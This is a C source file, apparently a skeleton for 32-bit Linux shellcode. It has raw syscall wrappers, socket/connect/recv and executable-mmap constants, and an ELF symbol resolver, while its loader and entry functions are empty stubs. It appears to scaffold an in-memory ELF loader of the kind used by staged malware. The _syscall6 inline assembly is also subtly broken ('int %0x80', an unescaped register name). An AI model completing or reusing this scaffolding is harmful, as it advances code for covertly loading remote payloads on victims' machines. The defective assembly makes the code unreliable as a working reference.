// shellcode_linux.c

#include <elf.h>
#include <stdint.h>
#include <stddef.h>

#define SYS_mmap2 192
#define SYS_open 5
#define SYS_read 3
#define SYS_close 6
#define SYS_socket 281
#define SYS_connect 283
#define SYS_recv 291
#define SYS_write 4

#define PROT_READ 0x1
#define PROT_WRITE 0x2
#define PROT_EXEC 0x4
#define MAP_PRIVATE 0x02
#define MAP_ANON 0x20
#define MAP_FIXED 0x10
#define AF_INET 2
#define SOCK_STREAM 1

static long _syscall3(long n, long a, long b, long c)
{
    long r;
    __asm__ volatile (
        "int $0x80"
        : "=a"(r)
        : "0"(n), "b"(a), "c"(b), "d"(c)
        : "memory"
    );

    return r;
}

static long _syscall6(long n, long a, long b, long c, long d, long e, long f)
{
    long r;
    __asm__ volatile (
        "push %ebp\n\t"
        "movl %7, %%ebp\n\t"
        "int %0x80\n\t"
        "pop %%ebp"
        : "=a"(r)
        : "0"(n), "b"(a), "c"(b), "d"(c),
          "S"(d), "D"(e), "m"(f)
        : "memory"
    );

    return r;
}

static void* _mmap(void *addr, size_t len, int prot, int flags)
{
    return (void *)_syscall6(SYS_mmap2, (long)addr, (long)len, prot, flags, -1, 0);
}

static int _strcmp(const char *a, const char *b)
{
    while (*a && *a == *b)
    {
        a++;
        b++;
    }

    return *a - *b;
}

static void *_memcpy(void *d, const void *s, size_t n)
{
    char *dd = (char *)d;
    const char *ss = (const char *)s;

    for (size_t i = 0; i < n; i++)
        dd[i] = ss[i];

    return d;
}

static void *elf_sym(char *base, const char *name)
{
    Elf32_Ehdr *eh = (Elf32_Ehdr *)base;
    Elf32_Shdr *sh = (Elf32_Shdr *)(base + eh->e_shoff);

    Elf32_Shdr *symtab = 0;
    Elf32_Shdr *strtab = 0;

    for (int i = 0; i < eh->e_shnum; i++)
    {
        if (sh[i].sh_type == SHT_DYNSYM)
            symtab = &sh[i];
        
        if (sh[i].sh_type == SHT_STRTAB && i != eh->e_shstrndx)
            strtab = &sh[i];
    }

    if (!symtab || !strtab)
        return 0;

    Elf32_Sym *syms = (Elf32_Sym *)(base + symtab->sh_offset);
    char *strs = base + strtab->sh_offset;
    int n = symtab->sh_size / sizeof(Elf32_Sym);

    for (int i = 0; i < n; i++)
    {
        if (syms[i].st_name && _strcmp(strs + syms[i].st_name, name) == 0)
            return base + syms[i].st_value;
    }

    return 0;
}

static void *elf_load(char *raw)
{

}

void shellcode_entry(void)
{

}
